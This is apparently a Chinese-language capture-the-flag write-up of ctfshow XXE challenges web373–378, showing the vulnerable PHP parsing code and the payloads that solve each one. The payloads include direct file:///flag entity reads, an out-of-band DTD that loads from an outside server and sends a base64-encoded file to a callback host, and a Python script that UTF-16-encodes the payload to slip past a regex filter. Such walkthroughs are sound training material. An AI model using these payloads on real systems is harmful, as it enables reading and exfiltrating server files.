## web373(有回显)

```php
<?php
error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
if(isset($xmlfile)){
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
    $creds = simplexml_import_dom($dom);
    $ctfshow = $creds->ctfshow;
    echo $ctfshow;
}
highlight_file(__FILE__);
```

```
libxml_disable_entity_loader — 禁用加载外部实体的功能,作用是设置是否禁止从外部加载XML实体，设为true就是禁止
```

```
simplexml_import_dom — 从DOM节点获取SimpleXMLElement对象
```

## web374，375，376(无回显)

```php
<?php
error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
if(isset($xmlfile)){
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
}
highlight_file(__FILE__);
```

payload：

```dtd
<!DOCTYPE convert [ 
<!ENTITY % remote SYSTEM "http://60.204.212.151/evil.dtd">
%remote;%int;%send;
]>
```

在服务器上放一个evil.dtd文件，内容如下

```dtd
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://43zptel7.requestrepo.com/%file;'>">
```

## web377(UTF-16编码绕过正则)

```php
<?php
error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
if(preg_match('/<\?xml version="1\.0"|http/i', $xmlfile)){
    die('error');
}
if(isset($xmlfile)){
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
}
highlight_file(__FILE__);
```

payload

用python代码，进行编码

```python
import requests

url = 'http://80d39f7c-21af-4ddd-b4ca-7b368785de72.challenge.ctf.show/'
payload = """<!DOCTYPE convert [ 
<!ENTITY % remote SYSTEM "http://60.204.212.151/evil.dtd">
%remote;%int;%send;
]>
"""
payload = payload.encode('utf-16')
print(payload)
print(requests.post(url, data=payload))
```

> 一个xml文档不仅可以用UTF-8编码，也可以用UTF-16(两个变体 - BE和LE)、UTF-32(四个变体 - BE、LE、2143、3412)和EBCDIC编码。
>
> 在这种编码的帮助下，使用正则表达式可以很容易地绕过WAF，因为在这种类型的WAF中，正则表达式通常仅配置为单字符集。
>
> 外来编码也可用于绕过成熟的WAF，因为它们并不总是能够处理上面列出的所有编码。例如，libxml2解析器只支持一种类型的utf-32 - utf-32BE，特别是不支持BOM。
>

## web378(引入外部实体)

```http
POST /doLogin HTTP/1.1
Host: 17b96e8f-2c07-4d3d-92c9-0950800b0c5a.challenge.ctf.show
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: application/xml, text/xml, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/xml;charset=utf-8
X-Requested-With: XMLHttpRequest
Content-Length: 119
Origin: http://17b96e8f-2c07-4d3d-92c9-0950800b0c5a.challenge.ctf.show
Connection: close
Referer: http://17b96e8f-2c07-4d3d-92c9-0950800b0c5a.challenge.ctf.show/

<!DOCTYPE root[
<!ENTITY xxe SYSTEM "file:///flag">
]>
<user><username>&xxe;</username><password>1</password></user>
```

payload

```dtd
<!DOCTYPE root[
<!ENTITY xxe SYSTEM "file:///flag">
]>
<user><username>&xxe;</username><password>1</password></user>
```

